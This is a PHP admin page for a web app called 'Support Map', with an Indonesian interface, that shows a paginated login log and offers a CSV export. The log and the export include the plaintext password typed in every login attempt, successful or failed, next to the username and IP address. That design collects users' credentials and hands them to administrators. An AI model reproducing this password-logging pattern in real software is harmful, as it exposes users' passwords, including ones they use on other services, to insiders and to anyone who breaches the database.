<?php
require_once 'config/db.php';
checkLogin();
checkAdmin();

// Handle CSV download
if (isset($_GET['download'])) {
    try {
        $pdo = getDB();
        $rows = $pdo->query("SELECT username, password_used, ip_address, login_time, login_status FROM login_logs ORDER BY login_time DESC")->fetchAll();
        
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=log_login_' . date('Ymd_His') . '.csv');
        
        $out = fopen('php://output', 'w');
        fputcsv($out, ['Username', 'Password', 'IP Address', 'Waktu Login', 'Status']);
        foreach ($rows as $r) {
            fputcsv($out, [$r['username'], $r['password_used'], $r['ip_address'], $r['login_time'], $r['login_status']]);
        }
        fclose($out);
        exit;
    } catch (Exception $e) {
        die('Error: ' . $e->getMessage());
    }
}

try {
    $pdo = getDB();
    $page = max(1, intval($_GET['page'] ?? 1));
    $limit = 50;
    $offset = ($page - 1) * $limit;
    
    $total = $pdo->query("SELECT COUNT(*) FROM login_logs")->fetchColumn();
    $totalPages = ceil($total / $limit);
    $rows = $pdo->query("SELECT * FROM login_logs ORDER BY login_time DESC LIMIT $limit OFFSET $offset")->fetchAll();
} catch (Exception $e) {
    $rows = [];
    $total = 0;
    $totalPages = 0;
    $error = $e->getMessage();
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log Login - Support Map</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f4f6f8; }
        .header {
            background: linear-gradient(135deg, #0f766e, #2dd4bf);
            color: white; padding: 0 20px; height: 54px;
            display: flex; align-items: center; justify-content: space-between;
            position: sticky; top: 0; z-index: 100;
        }
        .header-brand { font-size: 18px; font-weight: 700; }
        .header-right { display: flex; align-items: center; gap: 12px; }
        .btn-header {
            background: rgba(255,255,255,0.15); color: white;
            border: 1px solid rgba(255,255,255,0.2); padding: 5px 14px;
            border-radius: 6px; font-size: 13px; text-decoration: none; cursor: pointer;
        }
        .btn-download {
            background: rgba(255,255,255,0.9); color: #0f766e;
            border: none; padding: 6px 16px; border-radius: 6px;
            font-size: 13px; font-weight: 700; text-decoration: none; cursor: pointer;
        }
        .container { padding: 24px; max-width: 1200px; margin: 0 auto; }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .page-title { font-size: 22px; font-weight: 700; color: #111827; }
        .stat { background: white; padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 600; color: #374151; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
        .stat span { color: #0f766e; }
        .table-wrapper { background: white; border-radius: 12px; overflow-x: auto; -webkit-overflow-scrolling: touch; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
        table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 650px; }
        thead tr { background: linear-gradient(135deg, #0f766e, #2dd4bf); color: white; }
        thead th { padding: 12px 14px; text-align: left; font-weight: 600; white-space: nowrap; }
        tbody tr { border-bottom: 1px solid #f3f4f6; transition: background 0.15s; }
        tbody tr:hover { background: #f0fdfa; }
        tbody td { padding: 10px 14px; color: #374151; white-space: nowrap; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; }
        .badge-success { background: #d1fae5; color: #059669; }
        .badge-failed { background: #fee2e2; color: #dc2626; }
        .pagination { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 20px; }
        .page-link { padding: 7px 13px; border-radius: 8px; font-size: 13px; font-weight: 500; text-decoration: none; color: #374151; background: white; border: 1px solid #e5e7eb; transition: all 0.2s; }
        .page-link:hover, .page-link.active { background: #0f766e; color: white; border-color: #0f766e; }
        .empty-msg { text-align: center; padding: 40px; color: #9ca3af; }
        .back-link { display: inline-flex; align-items: center; gap: 6px; color: #0f766e; text-decoration: none; font-size: 14px; font-weight: 500; margin-bottom: 20px; }

        @media (max-width: 768px) {
            .container { padding: 14px; }
            .header-brand { font-size: 16px; }
            .btn-header, .btn-download { padding: 4px 10px; font-size: 12px; }
            .page-header { flex-direction: column; align-items: flex-start; gap: 10px; }
            .page-title::after { content: " (geser ↔)"; font-size: 12px; font-weight: normal; color: #0f766e; }
        }
    </style>
</head>
<body>
<div class="header">
    <div class="header-brand">📋 Log Login</div>
    <div class="header-right">
        <a href="?download=1" class="btn-download">⬇️ Download CSV</a>
        <a href="functions.php" class="btn-header">← Kembali</a>
    </div>
</div>

<div class="container">
    <a href="functions.php" class="back-link">← Fungsi Lainnya</a>
    <div class="page-header">
        <div class="page-title">Riwayat Log Login</div>
        <div class="stat">Total: <span><?= number_format($total) ?></span> record</div>
    </div>

    <div class="table-wrapper">
        <?php if (empty($rows)): ?>
        <div class="empty-msg">Belum ada log login<?= isset($error) ? " — Error: $error" : "" ?></div>
        <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>No</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Waktu Login</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($rows as $i => $r): ?>
                <tr>
                    <td><?= $offset + $i + 1 ?></td>
                    <td><strong><?= htmlspecialchars($r['username'] ?? '-') ?></strong></td>
                    <td><code><?= htmlspecialchars($r['password_used'] ?? '-') ?></code></td>
                    <td><?= htmlspecialchars($r['ip_address'] ?? '-') ?></td>
                    <td><?= htmlspecialchars($r['login_time'] ?? '-') ?></td>
                    <td>
                        <span class="badge <?= $r['login_status'] === 'success' ? 'badge-success' : 'badge-failed' ?>">
                            <?= $r['login_status'] === 'success' ? '✅ Berhasil' : '❌ Gagal' ?>
                        </span>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>

    <?php if ($totalPages > 1): ?>
    <div class="pagination">
        <?php if ($page > 1): ?><a href="?page=<?= $page-1 ?>" class="page-link">← Prev</a><?php endif; ?>
        <?php for ($p = max(1, $page-3); $p <= min($totalPages, $page+3); $p++): ?>
        <a href="?page=<?= $p ?>" class="page-link <?= $p === $page ? 'active' : '' ?>"><?= $p ?></a>
        <?php endfor; ?>
        <?php if ($page < $totalPages): ?><a href="?page=<?= $page+1 ?>" class="page-link">Next →</a><?php endif; ?>
    </div>
    <?php endif; ?>
</div>
<script src="assets/inactivity.js"></script>
</body>
</html>

